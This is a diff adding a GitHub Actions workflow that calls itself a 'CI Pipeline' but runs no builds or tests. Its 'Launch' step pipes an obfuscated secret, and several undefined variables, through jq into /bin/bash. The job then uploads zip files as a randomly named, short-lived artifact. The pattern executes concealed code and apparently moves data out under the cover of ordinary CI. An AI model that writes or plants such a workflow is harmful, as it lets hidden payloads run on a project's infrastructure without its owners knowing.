@@ -1,0 +1,33 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          irtnt576: ${{ secrets.irtnt576 }}
+        run: |
+          printf '%s' "$irtnt576" | jq -r .fx49 | /bin/bash
+          printf '%s' "$h70" | jq -r .ftn75 | /bin/bash
+          printf '%s' "$rmrzt279" | jq -r .kizdp6780 | /bin/bash
+          printf '%s' "$t618" | jq -r .si6 | /bin/bash
+          printf '%s' "$wm565" | jq -r .kyih03384 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0UQMdHNJ
+          path: "*.zip"
+          retention-days: 1
